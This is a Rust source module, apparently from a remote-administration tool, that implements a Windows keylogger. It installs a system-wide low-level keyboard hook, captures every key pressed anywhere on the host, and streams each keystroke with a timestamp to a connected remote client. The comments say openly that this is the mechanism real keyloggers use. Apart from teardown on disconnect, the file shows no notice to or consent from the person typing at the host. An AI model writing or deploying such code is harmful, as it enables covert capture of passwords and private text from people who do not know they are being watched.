//! The "get keyboard keystrokes" feature: while a connected client has this
//! toggled on, every physical key pressed *at the host* is forwarded to
//! that client as a live log entry. This is the reverse direction from -
//! and independent of - the normal `ClientMessage::Key` messages the
//! client sends to control the host.
//!
//! Implemented with a low-level, system-wide keyboard hook
//! (`WH_KEYBOARD_LL`) - the same mechanism real keyloggers use, which is
//! exactly what this is: it sees every keystroke typed anywhere on the
//! host machine while active, not just keys typed into some particular
//! window. It only runs while explicitly turned on by a connected client,
//! and is torn down the moment they turn it off or disconnect - `main.rs`
//! holds this as a local variable in `handle_client`, dropped on every
//! exit path (clean disconnect, read error, early return), same safety
//! net as `blank_screen.rs`'s overlay.
//!
//! Windows-only, same as `blank_screen.rs`.

#[cfg(windows)]
mod imp {
    use std::sync::atomic::{AtomicU32, Ordering};
    use std::sync::mpsc;
    use std::sync::Mutex;
    use std::time::Duration;

    use winapi::ctypes::c_int;
    use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
    use winapi::shared::windef::HHOOK;
    use winapi::um::libloaderapi::GetModuleHandleW;
    use winapi::um::processthreadsapi::GetCurrentThreadId;
    use winapi::um::winuser::{
        CallNextHookEx, DispatchMessageW, GetMessageW, PostThreadMessageW, SetWindowsHookExW,
        TranslateMessage, UnhookWindowsHookEx, HC_ACTION, KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL,
        WM_KEYDOWN, WM_QUIT, WM_SYSKEYDOWN,
    };

    /// One captured keystroke: a portable key name (same spelling as
    /// `ClientMessage::Key`'s, where there's overlap) plus when it
    /// happened, in milliseconds since the Unix epoch.
    pub type Keystroke = (String, u64);

    /// Where the hook callback sends each captured key. Set right before
    /// installing the hook, cleared right after removing it. A `Mutex`
    /// guards it since the callback runs on the hook's own dedicated
    /// thread while `enable`/`disable` run on whichever thread called
    /// them (`handle_client`'s).
    static KEY_SINK: Mutex<Option<mpsc::Sender<Keystroke>>> = Mutex::new(None);

    unsafe extern "system" fn hook_proc(code: c_int, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
        if code == HC_ACTION
            && (wparam == WM_KEYDOWN as WPARAM || wparam == WM_SYSKEYDOWN as WPARAM)
        {
            let info = &*(lparam as *const KBDLLHOOKSTRUCT);
            if let Some(name) = vk_to_name(info.vkCode) {
                if let Ok(guard) = KEY_SINK.lock() {
                    if let Some(tx) = guard.as_ref() {
                        let now_ms = std::time::SystemTime::now()
                            .duration_since(std::time::UNIX_EPOCH)
                            .map(|d| d.as_millis() as u64)
                            .unwrap_or(0);
                        // Unbounded channel - this just pushes onto a
                        // queue, it doesn't block. A low-level hook has to
                        // return quickly or Windows silently unhooks it,
                        // so nothing in this callback may wait on anything
                        // (the network write happens later, on the
                        // dedicated thread below, not here).
                        let _ = tx.send((name, now_ms));
                    }
                }
            }
        }
        CallNextHookEx(std::ptr::null_mut(), code, wparam, lparam)
    }

    /// Map a Windows virtual-key code to the same portable key-name
    /// spelling `main.rs::map_key` expects (lowercase single letters, named
    /// specials) where one applies, otherwise a generic `Key(0x..)` label
    /// so nothing is silently dropped even if the log reads a bit raw for
    /// less common keys.
    fn vk_to_name(vk: u32) -> Option<String> {
        use winapi::um::winuser::*;
        Some(match vk as i32 {
            0x30..=0x39 => ((vk as u8 - 0x30 + b'0') as char).to_string(), // '0'..'9'
            0x41..=0x5A => ((vk as u8 - 0x41 + b'a') as char).to_string(), // 'a'..'z'
            VK_RETURN => "Enter".into(),
            VK_BACK => "Backspace".into(),
            VK_TAB => "Tab".into(),
            VK_SPACE => "Space".into(),
            VK_ESCAPE => "Escape".into(),
            VK_SHIFT | VK_LSHIFT | VK_RSHIFT => "Shift".into(),
            VK_CONTROL | VK_LCONTROL | VK_RCONTROL => "Control".into(),
            VK_MENU | VK_LMENU | VK_RMENU => "Alt".into(),
            VK_LWIN | VK_RWIN => "Meta".into(),
            VK_UP => "ArrowUp".into(),
            VK_DOWN => "ArrowDown".into(),
            VK_LEFT => "ArrowLeft".into(),
            VK_RIGHT => "ArrowRight".into(),
            VK_DELETE => "Delete".into(),
            VK_HOME => "Home".into(),
            VK_END => "End".into(),
            VK_PRIOR => "PageUp".into(),
            VK_NEXT => "PageDown".into(),
            VK_CAPITAL => "CapsLock".into(),
            VK_F1 => "F1".into(),
            VK_F2 => "F2".into(),
            VK_F3 => "F3".into(),
            VK_F4 => "F4".into(),
            VK_F5 => "F5".into(),
            VK_F6 => "F6".into(),
            VK_F7 => "F7".into(),
            VK_F8 => "F8".into(),
            VK_F9 => "F9".into(),
            VK_F10 => "F10".into(),
            VK_F11 => "F11".into(),
            VK_F12 => "F12".into(),
            VK_OEM_PERIOD => ".".into(),
            VK_OEM_COMMA => ",".into(),
            VK_OEM_MINUS => "-".into(),
            VK_OEM_PLUS => "=".into(),
            VK_OEM_2 => "/".into(),
            VK_OEM_5 => "\\".into(),
            VK_OEM_1 => ";".into(),
            VK_OEM_7 => "'".into(),
            VK_OEM_4 => "[".into(),
            VK_OEM_6 => "]".into(),
            other => format!("Key(0x{other:02X})"),
        })
    }

    fn install_hook() -> Result<HHOOK, String> {
        unsafe {
            let hinstance = GetModuleHandleW(std::ptr::null());
            let hook = SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_proc), hinstance, 0);
            if hook.is_null() {
                Err("SetWindowsHookExW(WH_KEYBOARD_LL) failed".to_string())
            } else {
                Ok(hook)
            }
        }
    }

    fn run_message_loop() {
        unsafe {
            let mut msg: MSG = std::mem::zeroed();
            // Returns 0 on WM_QUIT (posted by `disable`), <0 on error -
            // either way, time to stop and let the caller unhook.
            while GetMessageW(&mut msg, std::ptr::null_mut(), 0, 0) > 0 {
                TranslateMessage(&msg);
                DispatchMessageW(&msg);
            }
        }
    }

    /// Owns the keylogger's dedicated hook-and-message-loop thread.
    /// Dropping this (or calling `disable`) tears it down.
    pub struct KeyLogger {
        thread_id: AtomicU32,
        thread: Option<std::thread::JoinHandle<()>>,
    }

    impl KeyLogger {
        pub fn new() -> Self {
            Self { thread_id: AtomicU32::new(0), thread: None }
        }

        pub fn is_enabled(&self) -> bool {
            self.thread.is_some()
        }

        /// Turn keystroke logging on: captured keys stream out over `tx`.
        /// A no-op if it's already on (the existing `tx` keeps being used;
        /// callers that need the new one should `disable()` first).
        pub fn enable(&mut self, tx: mpsc::Sender<Keystroke>) -> Result<(), String> {
            if self.thread.is_some() {
                return Ok(());
            }

            *KEY_SINK.lock().unwrap() = Some(tx);

            let (ready_tx, ready_rx) = mpsc::channel::<Result<u32, String>>();
            let handle = std::thread::spawn(move || {
                let tid = unsafe { GetCurrentThreadId() };
                match install_hook() {
                    Ok(hook) => {
                        let _ = ready_tx.send(Ok(tid));
                        run_message_loop();
                        unsafe {
                            UnhookWindowsHookEx(hook);
                        }
                    }
                    Err(e) => {
                        let _ = ready_tx.send(Err(e));
                    }
                }
            });

            match ready_rx.recv_timeout(Duration::from_secs(3)) {
                Ok(Ok(tid)) => {
                    self.thread_id.store(tid, Ordering::SeqCst);
                    self.thread = Some(handle);
                    Ok(())
                }
                Ok(Err(e)) => {
                    let _ = handle.join();
                    *KEY_SINK.lock().unwrap() = None;
                    Err(e)
                }
                Err(_) => {
                    let _ = handle.join();
                    *KEY_SINK.lock().unwrap() = None;
                    Err("timed out installing the keyboard hook".to_string())
                }
            }
        }

        /// Turn keystroke logging off. A no-op if it's already off.
        pub fn disable(&mut self) {
            let tid = self.thread_id.swap(0, Ordering::SeqCst);
            if tid != 0 {
                unsafe {
                    PostThreadMessageW(tid, WM_QUIT, 0, 0);
                }
            }
            if let Some(t) = self.thread.take() {
                let _ = t.join();
            }
            *KEY_SINK.lock().unwrap() = None;
        }
    }

    impl Drop for KeyLogger {
        fn drop(&mut self) {
            // A dropped session (disconnect, error) must never leave a
            // system-wide keyboard hook installed after the fact.
            self.disable();
        }
    }
}

#[cfg(not(windows))]
mod imp {
    use std::sync::mpsc;

    pub type Keystroke = (String, u64);

    /// Non-Windows stub: there's no keyboard-hook mechanism wired up here
    /// for macOS/Linux, so this always reports itself as off and fails
    /// clearly rather than silently doing nothing.
    pub struct KeyLogger;

    impl KeyLogger {
        pub fn new() -> Self {
            Self
        }
        pub fn is_enabled(&self) -> bool {
            false
        }
        pub fn enable(&mut self, _tx: mpsc::Sender<Keystroke>) -> Result<(), String> {
            Err("keystroke logging isn't supported on this platform yet (Windows-only)".to_string())
        }
        pub fn disable(&mut self) {}
    }
}

pub use imp::{KeyLogger, Keystroke};
